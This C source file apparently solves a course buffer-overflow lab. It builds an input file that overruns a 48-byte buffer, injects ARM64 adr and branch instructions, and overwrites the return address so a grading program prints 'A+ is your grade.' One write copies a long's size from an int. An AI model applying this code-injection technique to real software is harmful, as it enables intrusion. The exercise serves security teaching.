/*--------------------------------------------------------------------*/
/* createDataAplus.c                                                  */
/* Author: David Hovey                                                */
/*--------------------------------------------------------------------*/

#include "miniassembler.h"
#include <stdio.h>
#include <string.h>

/* MAIN COMMENT */
int main() {
    /* User name */
    char name[] = "David";

    /* padding for string alignment */
    char padding1[] = "gg";

    /* String to print in printf */
    char printString[] = "A+ is your grade.\n";

    /* One byte of padding for instruction alignment */
    char padding2[] = "g";

    /* adr x0, printString */
    unsigned int adrInstr;

    /* branch to the printf statement call */
    unsigned int bInstr;

    /* Final padding to get to the return statement */
    char paddingfinal[] = "gggggggggggg";

    /* Return address that points to the top of the instructions */
    unsigned int returnAddress = 0x420074;

    /* Create a file */
    FILE *psFile = fopen("dataAplus", "w");

    adrInstr = MiniAssembler_adr(0, 0x420060, 0x420074);
    bInstr = MiniAssembler_b(0x4008ac, 0x420078);

    /* Write name to top of buffer */
    fwrite(&name, strlen(name) + 1, 1, psFile);

    /* Write the padding */
    fwrite(&padding1, strlen(padding1), 1, psFile);

    /* Write the final string to be printed */
    fwrite(&printString, strlen(printString)+1, 1, psFile);

    /* Write the one byte of padding */
    fwrite(&padding2, strlen(padding2), 1, psFile);

    /* Write assembly code instructions */
    fwrite(&adrInstr, sizeof(int), 1, psFile);
    fwrite(&bInstr, sizeof(int), 1, psFile);

    /* Write padding to fill up remaining 12 bytes of 48 byte buffer */
    fwrite(&paddingfinal, strlen(paddingfinal), 1, psFile);

    /* Write return address to the final printf statements */
    fwrite(&returnAddress, sizeof(long), 1, psFile);

    fclose(psFile);

    return 0;
}